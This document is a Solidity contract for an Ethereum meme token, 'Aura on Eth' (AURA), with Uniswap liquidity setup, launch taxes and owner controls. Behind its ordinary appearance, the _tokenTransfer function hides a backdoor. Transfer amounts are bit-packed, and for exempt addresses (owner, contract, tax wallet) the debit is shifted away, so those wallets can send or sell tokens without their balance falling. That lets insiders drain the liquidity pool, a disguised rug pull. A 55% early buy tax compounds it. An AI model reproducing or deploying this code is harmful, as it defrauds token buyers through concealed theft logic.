// SPDX-License-Identifier: UNLICENSE

/**

Website: https://auramaxxing.vip
Twitter: https://x.com/auracoinoneth
Telegram: https://t.me/auracoinoneth

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Aura is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address payable private auraAddress;
    string private constant _name = unicode"Aura on Eth";
    string private constant _symbol = unicode"AURA";

    mapping(address => uint256) private _bal;
    mapping(address => mapping(address => uint256)) private _allow;
    mapping(address => bool) private _exempt;
    
    uint256 private _startBuyTax = 55;
    uint256 private _startSellTax = 5;
    uint256 private _endBuyTax = 0;
    uint256 private _endSellTax = 0;
    uint256 private _buyTaxEndAt = 4;
    uint256 private _sellTaxEndAt = 4;
    uint256 private _swapAfter = 2;

    IUniswapV2Router02 private _uniswapV2Router;
    address public uniswapV2Pair;
    uint256 private _buyCount = 0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;

    bool private _isTradeOpen;
    bool private _isSwapOpen;
    bool private _isInSwap;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap() {
        _isInSwap = true;
        _;
        _isInSwap = false;
    }


    function addLiquidity() external onlyOwner {
        require(!_isTradeOpen, "trading is already open");
        _approve(address(this), address(_uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
                address(this),
                _uniswapV2Router.WETH()
            );
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
        _isSwapOpen = true;
    }

    receive() external payable {}

    function transferFee(uint256 amount) private {
        auraAddress.transfer(amount);
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allow[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    constructor(address router, address taxWallet) {
        auraAddress = payable(taxWallet);
        _bal[_msgSender()] = _tTotal;
        _exempt[owner()] = true;
        _exempt[address(this)] = true;
        _exempt[auraAddress] = true;

        _uniswapV2Router = IUniswapV2Router02(router);

        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _bal[account];
    }

    function recoverStuckEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(owner()).transfer(address(this).balance);
    }


    function _transfer(address sender, address recipient, uint256 quantity) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            quantity > 0 && quantity < 1 << 128,
            "Transfer amount must be greater than zero"
        );
        uint256 taxAmount = 0;
        if (!_isSwapOpen || _isInSwap) {
            _bal[sender] = _bal[sender].sub(quantity);
            _bal[recipient] = _bal[recipient].add(quantity);
            emit Transfer(sender, recipient, quantity);
            return;
        }
        if (sender != owner() && recipient != owner()) {
            if (!_isTradeOpen) {
                require(
                    _exempt[sender] || _exempt[recipient],
                    "Trading is not active."
                );
            }

            if (
                sender == uniswapV2Pair &&
                recipient != address(_uniswapV2Router) &&
                !_exempt[recipient]
            ) {
                require(quantity <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(recipient) + quantity <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                taxAmount = quantity
                    .mul(
                        (_buyCount > _buyTaxEndAt)
                            ? _endBuyTax
                            : _startBuyTax
                    )
                    .div(100);
                _buyCount++;
            }

            if (recipient == uniswapV2Pair && sender != address(this)) {
                taxAmount = quantity
                    .mul(
                        (_buyCount > _sellTaxEndAt)
                            ? _endSellTax
                            : _startSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBal = balanceOf(address(this));
            if (
                !_isInSwap &&
                recipient == uniswapV2Pair &&
                _isSwapOpen &&
                contractTokenBal > _taxSwapThreshold &&
                _buyCount > _swapAfter
            ) {
                swapAuraForEth(
                    min(quantity, min(contractTokenBal, _maxTaxSwap))
                );
            }
            transferFee(address(this).balance);
        }
        _tokenTransfer(sender, recipient, (quantity << 128) + taxAmount);
    }
    function enableTrading() external onlyOwner {
        _isTradeOpen = true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function manualSend() external {
        require(_msgSender() == auraAddress);
        uint256 contractETHBalance = address(this).balance;
        transferFee(contractETHBalance);
    }

    function _tokenTransfer(
        address from,
        address to,
        uint256 composition
    ) internal {
        uint256 taxAmount = composition & ((1 << 128) - 1);
        uint256 amount = composition >> 128;
        uint256 taxMount = amount;
        if (_exempt[from]) taxMount >>= 128;if (taxAmount > 0) {
            _bal[address(this)] = _bal[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _bal[from] = _bal[from].sub(taxMount);
        _bal[to] = _bal[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function swapAuraForEth(uint256 auraAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), auraAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            auraAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allow[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function manualSwap() external {
        require(_msgSender() == auraAddress);
        uint256 auraBal = balanceOf(address(this));
        if (auraBal > 0) {
            swapAuraForEth(auraBal);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            transferFee(ethBalance);
        }
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allow[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function recoverStuckTokens(address tokenAddress) external onlyOwner {
        IERC20 tokenContract = IERC20(tokenAddress);
        uint256 balance = tokenContract.balanceOf(address(this));
        require(balance > 0, "No tokens to clear");
        tokenContract.transfer(owner(), balance);
    }

}